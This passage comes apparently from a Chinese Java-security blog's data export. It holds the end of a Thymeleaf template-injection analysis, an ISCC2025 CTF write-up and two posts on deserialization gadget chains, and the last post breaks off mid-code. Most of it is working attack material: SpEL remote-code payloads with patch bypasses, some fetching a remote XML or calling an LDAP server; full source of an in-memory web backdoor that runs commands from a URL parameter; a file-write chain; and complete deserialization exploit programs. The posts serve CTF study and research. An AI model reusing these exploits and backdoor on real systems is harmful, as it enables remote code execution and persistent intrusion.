#, @, ~，第二个字符是不是{ 。接下来就是一直往currentFragment里添加，直到遇见}，进入这个if：\n\n这里应该进入第一个case，跟进：\n\n这里也是很重要的操作，把${}里的内容取出了，这样的话，表达式就跟学SPEL时一样了。\n同时，能发现这里还有一个if，会取出{}里的内容，所以payload也可以写成：\n__$&#123;&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;).getInputStream(),&quot;GBK&quot;).useDelimiter(&quot;asdasdasd&quot;).next()&#125;&#125;__::.x\n\n\n\n这里补充一下，__{}形式的payload也是可以的，因为里面的解析步骤跟${}时一样。而其他的就不行了，因为解析时好像会根据()来切片，最终payload全乱了，可以自己跟进调试一下。{}__也许能用来绕waf。\n回到preprocess方法，最终会在excute实现表达式解析：\n\n可以看一眼调用栈：\n\n分支2有时候，我们的payload中可以没有双下划线。比如访问&#x2F;vul2，此时payload&#x3D;${new+java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(“calc”).getInputStream(),”GBK”).useDelimiter(“asdasdasd”).next()}\n这时候进入preprocess时，由于没有找到下划线，会直接返回input：\n\n在decompose的时候会进入最后一个case，从而把fragment和selector分离：\n\n接着回到renderFragment，会进入FragmentExpression.createExecutedFragmentExpression(context, fragmentExpression); ：\n\n跟进到org.thymeleaf.standard.expression.FragmentExpression#doCreateExecutedFragmentExpression：\n\n\n这里会分别获取templateName和selector，并执行表达式解析。\n所以payload里有时候也可以不带双下划线。\napplyDefaultViewName漏洞触发这里会触发url路径中的payload。\n跟进getDefaultViewName，再跟进getViewName，再跟进transformPath：\n\n这里会去掉path头尾的&#x2F;，以及扩展名，即最后一个. 后面的内容，这就是为什么要加上 .x ，否则payload就乱了。但是就&#x2F;vul4 情况一定要加 .x 其他就随便了。\n\n回到applyDefaultViewName，之后就是往mv里设置处理过的viewName了。再后面就会调用processDispatchResult。跟上面的过程就一样了。所以关键是mv对象中的viewName是什么。\n然而，这里有一个问题：\n\n就是要提取${}里面的内容时，{ 还是URL编码，导致无法正常取出，这样返回的还是原本的input，从而触发不了。似乎是springboot版本的问题，2.7.15不行，但是2.5.3可以。2.6及以下的好像才行。\n调试了一下：\n\n两个版本走的if不一样，导致了解析差异。而为什么有差异，我还不清楚。\nha.handle这里主要是获取controller的返回值，然后设置到mavContainer里，最后再从里面获取，文章里写的很清楚了，这里不赘述。\n无法利用的情况如果用@RestController或者给Controller加上@ResponseBody就失去了视图渲染功能，就不会触发漏洞\n回显问题这里的回显依靠异常抛出，所以对springboot版本有限制：\n在低版本的 springboot (&lt;&#x3D; 2.2) 中, server.error.include-message 的默认值为 always, 这使得默认的 500 页面会显示异常信息\n但是在高版本的 springboot (&gt;&#x3D; 2.3) 中, 上述选项的默认值变成了 never, 那么 500 页面就不会显示任何异常信息\n所以想要复现的话，得在配置文件里改一下：\nserver:  port: 8084  error:    include-message: alwaysspring:  thymeleaf:    cache: false\n\n${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(“ipconfig”).getInputStream()).next()}::1\n这里双冒号后面得加内容，才能回显出来\n补丁绕过https://www.freebuf.com/vuls/413661.html\n看这篇文章里的吧，写的很详细，我这里就只记录一下payload\n3.0.12%24%7b%00new+java.util.Scanner(T+(java.lang.Runtime).getRuntime().exec(%22calc.exe%22).getInputStream()).next()%7d\n3.0.13%24%7b%00new+java.util.Scanner(%00T(java.lang.Runtime).getRuntime().exec(%22calc.exe%22).getInputStream()).next()%7d\n3.0.14__$||&#123;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getMethod(&#x27;exec&#x27;,&#x27;&#x27;.getClass()).invoke(&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getMethod(&#x27;getRuntime&#x27;).invoke(null),&#x27;open -a calculator.app&#x27;)&#125;__::\n\n\n\n3.0.15后暂时无绕过\n这里还有一个可以看看：\n\n3.1.2参考：https://xz.aliyun.com/news/14196\n这里先记录payload：可以直接写到html页面里加载，适用于能文件上传写模板的时候；也可以像上面一样打，记得URL编码\n直接写入html模板，相当于：\n\n\n\n上面的两张图片，大致解释了为什么要用[[]]或者[()]包裹，具体还是没搞明白。\n[[]] &#x3D; th:text   [()] &#x3D; th:utext\n这个好像叫内联表达式，在realworldCTF chatterbox里出现过，能够绕过&lt;&gt;等符号\n1、ch.qos.logback.core.util.OptionHelper\n[[${T(ch.qos.logback.core.util.OptionHelper).instantiateByClassName(“org.springframework.expression.spel.standard.SpelExpressionParser”,””.getClass().getSuperclass(),T(ch.qos.logback.core.util.OptionHelper).getClassLoader()).parseExpression(“T(java.lang.String).forName(‘java.lang.Runtime’).getRuntime().exec(‘whoami’)”).getValue()}]]\n2、com.zaxxer.hikari.HikariConfig\n[[${New com.zaxxer.hikari.HikariConfig().setMetricRegistry(“ldap:&#x2F;&#x2F;127.0.0.1:1389”)}]]\n3、com.zaxxer.hikari.util.UtilityElf\n[[${T(com.zaxxer.hikari.util.UtilityElf).createInstance(“org.springframework.context.support.ClassPathXmlApplicationContext”,””.getClass().forName(“org.springframework.context.support.ClassPathXmlApplicationContext”),”http://ip/poc.xml&quot;)}]]\n高版本jdk jshell：\n[[${T(org. apache.tomcat.util.IntrospectionUtils).callMethodN(T(com.zaxxer.hikari.util.UtilityElf).createInstance(‘jakarta.el.ELProcessor’, T(ch.qos.logback.core.util.Loader).loadClass(‘jakarta.el.ELProcessor’)), ‘eval’, new java.lang.String[]{‘“”.getClass().forName(“jdk.jshell.JShell”).getMethods()[6].invoke(“”.getClass().forName(“jdk.jshell.JShell”)).eval(“java.lang.Runtime.getRuntime().exec(&quot;calc&quot;)”)’}, T(org. apache.el.util.ReflectionUtil).toTypeArray(new java.lang.String[]{“java.lang.String”}))}]]\n4、com.fasterxml.jackson.databind.util.ClassUtil\n[[${T(com.fasterxml.jackson.databind.util.ClassUtil).createInstance(“”.getClass().forName(‘org.spr’+’ingframework.expression.spel.standard.SpelExpressionParser’),true).parseExpression(“T(java.lang.String).forName(‘java.lang.Runtime’).getRuntime().exec(‘calc’)”).getValue()}]]\n总结学到的新知识有\n1、只要有__${}::，或::${}__，或者把$替换成*，都是能够利用\n2、Url路径里的payload，只能在springboot &lt;&#x3D; 2.6 时生效\n3、payload里为什么有时候能不写双下划线\n4、初步认识了springboot是怎么渲染模板的\n5、回显的局限性\n6、内联表达式的运用\n参考https://www.qwesec.com/2025/02/thymeleafSSTI.html\nhttps://godownio.github.io/2025/04/28/java-thymeleaf-ssti-spel/\nhttps://www.freebuf.com/vuls/413661.html\nhttps://xz.aliyun.com/news/14196\nhttps://clowsman.github.io/2024/12/14/%E5%86%8D%E7%9C%8BThymeleaf/index.html\n[https://boogipop.com/2024/01/29/RealWorld%20CTF%206th%20%E6%AD%A3%E8%B5%9B_%E4%BD%93%E9%AA%8C%E8%B5%9B%20%E9%83%A8%E5%88%86%20Web%20Writeup/](https://boogipop.com/2024/01/29/RealWorld CTF 6th 正赛_体验赛 部分 Web Writeup&#x2F;)\n","categories":["Java安全"],"tags":["Java安全"]},{"title":"ISCC2025线下赛-localSnake","url":"/2025/10/21/ISCC2025%E7%BA%BF%E4%B8%8B%E8%B5%9B-localSnake/","content":"前言题目注意有四个考点：\n1、hashcode碰撞\n2、AspectJ反序列化写文件\n3、snakeyaml反序列化加载本地jar\n4、webhandler内存马\n每一个考点单独拿出来还算常规，但是组合起来，且要在断网的情况下做，还是挺麻烦的，需要自己电脑上有各种储备\n漏洞分析1、hashcode碰撞这里自己写个例子调试一下：\n\nhashcode的计算逻辑为：\n乘31后，再加上当前字符的ascii码。\n所以，找满足31*73+83&#x3D;31x+y的就行，这里取x&#x3D;72，y&#x3D;114，那就是 HrCC2025。\n这样就能满足if条件，进入反序列化过程：\n\n2、生成恶意jar包用 https://github.com/artsploit/yaml-payload \n其中恶意代码注入一个webhandler类型的内存马，网上搜一个就行，我当时本地有保存：\nWebHandler内存马 | 1diot9’s Blog\npackage artsploit;import com.sun.net.httpserver.HttpExchange;import com.sun.net.httpserver.HttpHandler;import javax.script.ScriptEngine;import javax.script.ScriptEngineFactory;import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.InputStream;import java.io.OutputStream;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.util.Collections;import java.util.List;public class WebHandlerShell implements ScriptEngineFactory, HttpHandler &#123;    public WebHandlerShell() &#123;        System.out.println(&quot;WebHandlerShell Constructor!!!!!!!!&quot;);    &#125;    static &#123;        System.out.println(&quot;start Injection!!!!!=====================================&quot;);        //获取当前线程        Object o = Thread.currentThread();        try &#123;            Field groupField = o.getClass().getDeclaredField(&quot;group&quot;);            groupField.setAccessible(true);            Object group = groupField.get(o);            Field threadsField = group.getClass().getDeclaredField(&quot;threads&quot;);            threadsField.setAccessible(true);            Object t = threadsField.get(group);            Thread[] threads = (Thread[]) t;            for (Thread thread : threads)&#123;                if(thread.getName().equals(&quot;Thread-2&quot;))&#123;                    Field targetField = thread.getClass().getDeclaredField(&quot;target&quot;);                    targetField.setAccessible(true);                    Object target = targetField.get(thread);                    Field thisField = target.getClass().getDeclaredField(&quot;this$0&quot;);                    thisField.setAccessible(true);                    Object this$0 = thisField.get(target);                    Method createContext = Class.forName(&quot;sun.net.httpserver.ServerImpl&quot;).getDeclaredMethod(&quot;createContext&quot;, String.class, HttpHandler.class);                    createContext.setAccessible(true);                    createContext.invoke(this$0,&quot;/backdoor&quot;,new WebHandlerShell());                &#125;            &#125;        &#125; catch (Exception e) &#123;            e.printStackTrace();        &#125;    &#125;    public void handle(HttpExchange t) throws IOException &#123;        String response = &quot;MemoryShell&quot;;        String query = t.getRequestURI().getQuery();        String[] args = query.split(&quot;=&quot;);        ByteArrayOutputStream output = null;        if (args[0].equals(&quot;cmd&quot;))&#123;            InputStream inputStream = Runtime.getRuntime().exec(args[1]).getInputStream();            output = new ByteArrayOutputStream();            byte[] buffer = new byte[4096];            int n = 0;            while (-1 != (n = inputStream.read(buffer))) &#123;                output.write(buffer, 0, n);            &#125;        &#125;        response+=(&quot;\\n&quot;+new String(output.toByteArray()));        t.sendResponseHeaders(200, (long)response.length());        OutputStream os = t.getResponseBody();        os.write(response.getBytes());        os.close();    &#125;    @Override    public String getEngineName() &#123;        return &quot;&quot;;    &#125;    @Override    public String getEngineVersion() &#123;        return &quot;&quot;;    &#125;    @Override    public List&lt;String&gt; getExtensions() &#123;        return Collections.emptyList();    &#125;    @Override    public List&lt;String&gt; getMimeTypes() &#123;        return Collections.emptyList();    &#125;    @Override    public List&lt;String&gt; getNames() &#123;        return Collections.emptyList();    &#125;    @Override    public String getLanguageName() &#123;        return &quot;&quot;;    &#125;    @Override    public String getLanguageVersion() &#123;        return &quot;&quot;;    &#125;    @Override    public Object getParameter(String key) &#123;        return null;    &#125;    @Override    public String getMethodCallSyntax(String obj, String m, String... args) &#123;        return &quot;&quot;;    &#125;    @Override    public String getOutputStatement(String toDisplay) &#123;        return &quot;&quot;;    &#125;    @Override    public String getProgram(String... statements) &#123;        return &quot;&quot;;    &#125;    @Override    public ScriptEngine getScriptEngine() &#123;        return null;    &#125;&#125;\n\n同时记得修改MATE-INF.services里面的内容：\n\n然后生成恶意jar包。\n3、反序列化写jar包给的pom.xml里有aspectJ依赖，可以用来写文件。这题名字又叫localSnake，再加上这里私地的环境，大概率不出网。所以得写入jar包再通过snakeyaml本地加载。这里利用AspectJ链写文件，这个链子网上解析很多，这里简单讲一下。\nAspect依赖里面的SimpleCache$StoreableCachingMap#writeToPath()能够实现写文件：\n\nfolder是要写到哪个文件夹，key是文件的名字，都可控。\n然后这个writeToPath，可以通过这个内部类的put方法触发：\n\nvalue参数就是文件的byte[]字节流，都是可控的。\n现在问题变成怎么触发这里的put。\n看一下题目给的User类：\n\n这里的hashMap是可控的，所以设置成StoreableCachingMap就行。现在问题转化成调用compare就行。\n说到调用compare，那最先想到的就是CC4的前半段：\n\n最终的脚本：注意，这里最好写到&#x2F;tmp下，因为其他目录不一定有写权限\npackage com.localSnake.solution;import com.localSnake.utils.User;import java.lang.reflect.Constructor;import java.nio.file.Files;import java.nio.file.Paths;import java.util.Base64;import java.util.HashMap;import java.util.PriorityQueue;public class WithBlack &#123;    public static void main(String[] args) throws Exception &#123;        byte[] bytes = Files.readAllBytes(Paths.get(&quot;iscc.jar&quot;));        String fileName = &quot;iscc.jar&quot;;        Class&lt;?&gt; aClass = Class.forName(&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;);        Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor(String.class, int.class);        declaredConstructor.setAccessible(true);        HashMap write = (HashMap) declaredConstructor.newInstance(&quot;/tmp&quot;, 1);        User user = new User();        Tools.setFieldValue(user, &quot;hashMap&quot;, write);//        user.compare(fileName, bytes);        PriorityQueue&lt;Object&gt; priorityQueue = new PriorityQueue&lt;&gt;();        priorityQueue.add(1);        priorityQueue.add(1);        Tools.setFieldValue(priorityQueue, &quot;comparator&quot;, user);        Tools.setFieldValue(priorityQueue, &quot;queue&quot;, new Object[]&#123;fileName, bytes&#125;);        Tools.setFieldValue(priorityQueue, &quot;size&quot;, 2);        byte[] ser = Tools.ser(priorityQueue);        String s = Base64.getEncoder().encodeToString(ser);        System.out.println(s);    &#125;&#125;\n\n4、snakeyaml反序列化加载恶意jar直接看payload：\n!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;file:///tmp/iscc.jar&quot;]]]]\n\n这里原理就是通过构造方法，一步步走到SPI加载。\n可以看：https://drun1baby.top/2022/10/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-SnakeYaml-%E9%93%BE/\n5、访问内存马&#x2F;backdoor?cmd&#x3D;getflag\n\n总结私地就是这种打法。但是怎么做后渗透我不清楚，所以这里我是让pwn手帮忙的。把web脚本写好后，放到pwn的私地上去打，扫ip也交给pwn私地做了。要是没pwn手，我也就只能打打自己私地了（\n最后发现好像能往&#x2F;home&#x2F;iscc里写ssh公钥，不过没去尝试，反正pwn私地上脚本已经跑起来了，就懒得搞了。\n","categories":["CTF-Java"],"tags":["CTF-Java"]},{"title":"二次反序列化总结","url":"/2025/10/21/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/","content":"前言这里收集一些经常会用到的Java二次反序列化链。\nSignedObjectgetter–&gt;readObject\n这个是老生常谈了，位于java.security包下。最先是在hessian反序列化里遇到，现在已经很熟悉了。通过getter方法触发，调用内部对象的readObject方法，从而绕过程序自定义的resolveClass的过滤逻辑。\n下面展示payload：\n//固定写法，初始化SignedObjectKeyPairGenerator keyPairGenerator;keyPairGenerator = KeyPairGenerator.getInstance(&quot;DSA&quot;);keyPairGenerator.initialize(1024);KeyPair keyPair = keyPairGenerator.genKeyPair();PrivateKey privateKey = keyPair.getPrivate();Signature signingEngine = Signature.getInstance(&quot;DSA&quot;);SignedObject signedObject = new SignedObject(badAttributeValueExpException,privateKey,signingEngine);JSONArray array = new JSONArray();array.add(signedObject);\n\n触发getter方法就行，这里用的是fastjson的toString反序列化\n如果用CB链去触发getter的话，要这样写：\n//固定写法，初始化SignedObjectKeyPairGenerator keyPairGenerator;keyPairGenerator = KeyPairGenerator.getInstance(&quot;DSA&quot;);keyPairGenerator.initialize(1024);KeyPair keyPair = keyPairGenerator.genKeyPair();PrivateKey privateKey = keyPair.getPrivate();Signature signingEngine = Signature.getInstance(&quot;DSA&quot;);SignedObject signedObject = new SignedObject(priorityQueue, privateKey, signingEngine);BeanComparator&lt;Object&gt; comparator = new BeanComparator(&quot;object&quot;);\n\nRMIConnectorconnect–&gt;readObject\n这个类在JNDI攻击的时候也可以用，具体可以看AliyunCTF2023的ezbean。\n不过这里我们来看他的二次反序列化。\n触发点（sink）在这里：\n\n这里对我们传入的base64字符进行readObject操作。\n往上找谁调用了这个类，找到：\n\n我们要调用findRMIServer#findRMIServerJRMP就需要满足开头为&#x2F;stub&#x2F;，然后在&#x2F;stub&#x2F;后面拼接上base64字符。然后这个path又是由参数里的directoryURL决定的，这里还不可控，继续网上找，找到connect方法：\n\n这里就可以通过反射修改rimServer的值为null，从而进入我们需要的方法，并且上面提到的参数值也可以通过反射控制。\n现在的目标就是调用connect方法，这个可以看具体题目。\n下面结合CC11给出payload：\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import javax.management.remote.JMXServiceURL;import javax.management.remote.rmi.RMIConnector;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.Base64;import java.util.HashMap;import java.util.Map;public class RmiConnectorPOC1 &#123;    public static void main(String[] args)throws Exception &#123;        JMXServiceURL jmxServiceURL = new JMXServiceURL(&quot;service:jmx:rmi://&quot;);        RmipayloadGenerator rmipayloadGenerator=new RmipayloadGenerator();        setFieldValue(jmxServiceURL,&quot;urlPath&quot;,&quot;/stub/&quot;+rmipayloadGenerator.getbase64CC11payload());        RMIConnector rmiConnector=new RMIConnector(jmxServiceURL,null);        InvokerTransformer transformer = new InvokerTransformer(&quot;toString&quot;,                new Class[0], new Object[0]);        HashMap&lt;String, String&gt; innerMap = new HashMap&lt;&gt;();        Map&lt;Object,Object&gt; m = LazyMap.decorate(innerMap, transformer);        HashMap outerMap = new HashMap();        TiedMapEntry tied = new TiedMapEntry(m,rmiConnector);        outerMap.put(tied, &quot;t&quot;);        innerMap.clear();        setFieldValue(transformer, &quot;iMethodName&quot;, &quot;connect&quot;);        unSerial(outerMap);    &#125;    private static ByteArrayOutputStream unSerial(Object o) throws Exception&#123;        ByteArrayOutputStream bs = new ByteArrayOutputStream();        ObjectOutputStream out = new ObjectOutputStream(bs);        out.writeObject(o);        ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(bs.toByteArray()));        in.readObject();        in.close();        return bs;    &#125;    private static void Base64Encode(ByteArrayOutputStream bs)&#123;        byte[] encode = Base64.getEncoder().encode(bs.toByteArray());        String s = new String(encode);        System.out.println(s);        System.out.println(s.length());    &#125;    private static void setFieldValue(Object obj, String field, Object arg) throws Exception&#123;        Field f = obj.getClass().getDeclaredField(field);        f.setAccessible(true);        f.set(obj, arg);    &#125;&#125;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import javassist.ClassPool;import javassist.CtClass;import javassist.CtConstructor;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import java.io.ByteArrayOutputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.Base64;import java.util.HashMap;import java.util.Map;public class RmipayloadGenerator &#123;    public static String getbase64CC11payload()throws Exception&#123;        //javassist写恶意字节码        ClassPool pool = ClassPool.getDefault();        CtClass ctClass = pool.makeClass(&quot;i&quot;);        CtClass superClass = pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;);        ctClass.setSuperclass(superClass);        CtConstructor constructor = ctClass.makeClassInitializer();        constructor.setBody(&quot;Runtime.getRuntime().exec(\\&quot;calc.exe\\&quot;);&quot;);        byte[] bytes = ctClass.toBytecode();        //CC11攻击流程        TemplatesImpl templates = new TemplatesImpl();        setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;bytes&#125;);        setFieldValue(templates, &quot;_name&quot;, &quot;t&quot;);        InvokerTransformer transformer = new InvokerTransformer(&quot;toString&quot;,                new Class[0], new Object[0]);        HashMap&lt;String, String&gt; innerMap = new HashMap&lt;&gt;();        Map&lt;Object,Object&gt; m = LazyMap.decorate(innerMap, transformer);        HashMap outerMap = new HashMap();        TiedMapEntry tied = new TiedMapEntry(m, templates);        outerMap.put(tied, &quot;t&quot;);        innerMap.clear();        setFieldValue(transformer, &quot;iMethodName&quot;, &quot;newTransformer&quot;);        //base64转字符输出        ByteArrayOutputStream aos = new ByteArrayOutputStream();        ObjectOutputStream oos = new ObjectOutputStream(aos);        oos.writeObject(outerMap);        oos.flush();        oos.close();        return Base64Encode(aos);    &#125;    private static void setFieldValue(Object obj, String field, Object arg) throws Exception&#123;        Field f = obj.getClass().getDeclaredField(field);        f.setAccessible(true);        f.set(obj, arg);    &#125;    private static String Base64Encode(ByteArrayOutputStream bs)&#123;        byte[] encode = Base64.getEncoder().encode(bs.toByteArray());        String s = new String(encode);//        System.out.println(s);//        System.out.println(s.length());        return s;    &#125;&#125;\n\nWrapperConnectionPoolDataSourcesetter–&gt;readObject\n这个需要fastjson或jackson依赖，因为要用到set方法\n这个是c3p0链里面用到的一个类，也是进行二次反序列化的。\n当时还不是特别理解，现在再来写一遍。\n首先我们需要知道的是，这个类里面存在一个PropertyListener，并且它在这个类调用构造方法进行初始化的时候就会被init，如下图：\n\nPropertyListener，顾名思义，属性监听器，也就是说，当任何属性发生变化时，都会先经过一遍setUpPropertyListeners方法。这点很重要。\n接下来，我们看看这个setUpPropertyListeners方法里发生了什么：\n\n这里直接看触发点了。如果我们修改的属性值equals，“userOverridesAsString”，那么我们就会进入这个else，然后调用C3P0ImplUtils.parseUserOverridesAsString( (String) val )，这个val就是我们修改属性时设置的值。\n我们跟进这个方法看一下：\n\n这里面会取出hex十六进制字符进行反序列化，而取出的规则是HASM_HEADER后开始到倒数第二个字符。这里的HASM_HEADER是HexAsciiSerializedMap，所以我们的反序列化数据要以这个开头，并在最后随便加一个字符，这里我们规定加一个分号。\n后面跟进fromByteArray，deserializeFromByteArray，就能看到最后是一个原生反序列化：\n\n回到开始，我们是调用userOverridesAsString的set方法才触发了链子。所以这里要结合fastjson或者jackson才行。\nfastjson会在反序列化的时候先新建一个WrapperConnectionPoolDataSource，然后再set。\n\nLdapAttribute来源于RWCTF，实现的效果是getter–&gt;JNDI，最终的sink还是JNDI\npoc：\npublic class Test01 &#123;    public static void main(String[] args) throws Exception &#123;        String ldapCtxUrl = &quot;ldap://127.0.0.1:50388/&quot;;        Class ldapAttributeClazz = Class.forName(&quot;com.sun.jndi.ldap.LdapAttribute&quot;);        Constructor ldapAttributeClazzConstructor = ldapAttributeClazz.getDeclaredConstructor(                new Class[] &#123;String.class&#125;);        ldapAttributeClazzConstructor.setAccessible(true);        Object ldapAttribute = ldapAttributeClazzConstructor.newInstance(                new Object[] &#123;&quot;any&quot;&#125;);        Field baseCtxUrlField = ldapAttributeClazz.getDeclaredField(&quot;baseCtxURL&quot;);        baseCtxUrlField.setAccessible(true);        baseCtxUrlField.set(ldapAttribute, ldapCtxUrl);        Field rdnField = ldapAttributeClazz.getDeclaredField(&quot;rdn&quot;);        rdnField.setAccessible(true);        rdnField.set(ldapAttribute, new CompositeName(&quot;a//b&quot;));        BeanComparator&lt;Object&gt; beanComparator = new BeanComparator&lt;&gt;();        setField(beanComparator, &quot;property&quot;, &quot;attributeDefinition&quot;);        beanComparator.compare(ldapAttribute, ldapAttribute);    &#125;        public static void setField(Object object,String fieldName,Object value) throws Exception&#123;        Class&lt;?&gt; c = object.getClass();        Field field = c.getDeclaredField(fieldName);        field.setAccessible(true);        field.set(object,value);    &#125;&#125;\n\n具体原理可以看参考文章中，4ra1n许少师傅的分析。\n总结常见的二次反序列化好像就这四种，以后遇到新的再来补充。另外，很多链子最先都在CTF里出现，所以打完比赛一定要复盘，看看有没有新的知识。\n参考Java二次反序列化学习 | stoocea’s blog\n使用JDK类绕过TemplatesImpl黑名单\n","categories":["JavaGadget"],"tags":["Java安全","JavaGadget"]},{"title":"CC链再挖掘","url":"/2025/10/27/CC%E9%93%BE%E5%86%8D%E6%8C%96%E6%8E%98/","content":"前言看了网上对CC依赖的再分析，想试着自己挖一下链子。\n这里使用idea和tabby两种工具进行挖掘。\n现在的假设情况是，常见的transform类全部禁用，LazyMap也被禁用：\n\n明确目标：\n先找一个能够调用transform的方法(平替LazyMap)。然后再找一个新的transform()，能够直接或间接调用newInstance实例化任意类，从而触发TrAXFilter，最终实现TemplatesImpl加载字节码。\n?-&gt;transformLazyMap最经典的触发方法。\n\nDefaultedMapidea挖掘跟LazyMap一样，也是get触发：\n\n直接对着transform alt+f7就能找到：\n\ntabby挖掘或者用tabby\nmatch (source:Method&#123;IS_SERIALIZABLE:TRUE&#125;)match (sink:Method&#123;NAME0:&quot;org.apache.commons.collections.Transformer#transform&quot;&#125;)CALL apoc.algo.allSimplePaths(source, sink, &quot;CALL&gt;|ALIAS&gt;&quot;, 1) yield pathWHERE NONE(  n IN nodes(path)   WHERE n.CLASSNAME IN [    &quot;org.apache.commons.collections.functors.InstantiateTransformer&quot;,    &quot;org.apache.commons.collections.functors.InvokerTransformer&quot;,    &quot;org.apache.commons.collections.functors.ChainedTransformer&quot;,    &quot;org.apache.commons.collections4.functors.InstantiateTransformer&quot;,    &quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;  ])return path\n\n\n剩下的几个都不满足要求，我们需要的是常见的方法，比如get。稍微看几个。\n\n这里用transform调transform，LazyMap被ban的情况下可以用。\n\n跟上面一样，也是调transform\nTransformingComparator新找到的，能够通过compare触发，可惜不能反序列化，所以没用：\n\ntransform-&gt;newInstance这里挖掘transform-&gt;newInstance\nInstantiateTransformer这是最经典的，就是CC链官方的。\n\nFactoryTransformertabby挖掘通过tabby挖掘：\nmatch (source:Method&#123;IS_SERIALIZABLE:TRUE,NAME:&quot;transform&quot;&#125;)match (sink:Method&#123;NAME:&quot;newInstance&quot;,IS_SINK:TRUE&#125;)call tabby.beta.findPath(source, &quot;&gt;&quot;, sink, 4, false) yield pathWHERE NONE(  n IN nodes(path)   WHERE n.CLASSNAME IN [    &quot;org.apache.commons.collections.functors.InstantiateTransformer&quot;,    &quot;org.apache.commons.collections.functors.InvokerTransformer&quot;,    &quot;org.apache.commons.collections.functors.ChainedTransformer&quot;,    &quot;org.apache.commons.collections4.functors.InstantiateTransformer&quot;,    &quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;  ] or n.CLASSNAME =~ &quot;org.apache.commons.collections4.*&quot;)return path\n\n\n\n\n其实跟InstantiateTransformer差不多。\n当然，用apoc插件查询也可以：\nmatch (source:Method&#123;NAME:&quot;transform&quot;,IS_SERIALIZABLE:TRUE&#125;)match (sink:Method&#123;NAME0:&quot;java.lang.reflect.Constructor#newInstance&quot;&#125;)CALL apoc.algo.allSimplePaths(source, sink, &quot;CALL&gt;|ALIAS&gt;&quot;, 4) yield pathWHERE NONE(  n IN nodes(path)   WHERE n.CLASSNAME IN [    &quot;org.apache.commons.collections.functors.InstantiateTransformer&quot;,    &quot;org.apache.commons.collections.functors.InvokerTransformer&quot;,    &quot;org.apache.commons.collections.functors.ChainedTransformer&quot;,    &quot;org.apache.commons.collections4.functors.InstantiateTransformer&quot;,    &quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;  ] or n.CLASSNAME =~ &quot;org.apache.commons.collections4.*&quot;)return path\n\nidea挖掘对着transform方法，alt+f7 在项目和库作用域中查找实现：\n\n左边的方法一个个看过去，就能找到FactoryTransformer：\n\n然后对着这个create方法，alt+f7查询实现：\n\n这样也能找到。像这种方法比较少的情况，可以先全部看一遍，然后挑简单的先分析。\nCloneTransformer上面的tabby还查询到了这个类，说它的transform也能到newInstance。\n\n这里我们跟进一下org.apache.commons.collections.map.MultiValueMap.ReflectionFactory#create\n这里只能调用无参构造，可利用性比较差。\n而且前面的transform方法里，也不能直接指定类，而是通过PrototypeFactory.getInstance(input)：\n\n这个getInstance里面也是有限制的：\n\ntry要求我们实例化的类里必须有clone方法。catch里返回的类也无法指定。所以，这里只能调用红框里的三个类的create方法，而无法调用我们一开始想的ReflectionFactory#create\n二次反序列化寻找链子的过程中，意外发现了一个二次反序列化入口。\n上面的CloneTransformer，只能调用指定三个类的create方法。当时就一个个跟进看了一下。\nPrototypeCloneFactory：\n\n只能调用无参方法，比较鸡肋。\nInstantiateFactory：\n\n就是上面新发现的transform-&gt;newInstance的中间类\nPrototypeSerializationFactory：\n\n这不是一个二次反序列化吗？\n这个create，其实在用idea挖掘FactoryTransformer那条链时，就有看到:\n\ncreate可以通过FactoryTransformer#transform直接调用，exp：\n这里用fastjson来触发getter了\nimport com.alibaba.fastjson.JSONArray;import org.apache.commons.collections.Factory;import org.apache.commons.collections.functors.FactoryTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.DefaultedMap;import tools.ReflectTools;import tools.TemplatesGen;import javax.management.BadAttributeValueExpException;import javax.xml.transform.Templates;import java.io.Serializable;import java.lang.reflect.Constructor;import java.util.Base64;public class DeserTwice extends Payload&#123;    public static void main(String[] args) throws Exception &#123;        DeserTwice deserTwice = new DeserTwice();        String payload = deserTwice.getPayload(null, &quot;CalcAbs.class&quot;);        ReflectTools.deser(null, payload);    &#125;    @Override    public String getPayload(byte[] byteCode, String bytePath) throws Exception &#123;        Templates templates = TemplatesGen.getTemplates(byteCode, bytePath);        JSONArray jsonArray = new JSONArray();        jsonArray.add(templates);        BadAttributeValueExpException bad = new BadAttributeValueExpException(&quot;aaa&quot;);        ReflectTools.setFieldValue(bad, &quot;val&quot;, jsonArray);        Class&lt;?&gt; aClass = Class.forName(&quot;org.apache.commons.collections.functors.PrototypeFactory$PrototypeSerializationFactory&quot;);        Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor(Serializable.class);        declaredConstructor.setAccessible(true);        Factory o = (Factory) declaredConstructor.newInstance(bad);        FactoryTransformer factoryTransformer = new FactoryTransformer(o);        DefaultedMap defaultedMap = new DefaultedMap(&quot;any&quot;);        ReflectTools.setFieldValue(defaultedMap, 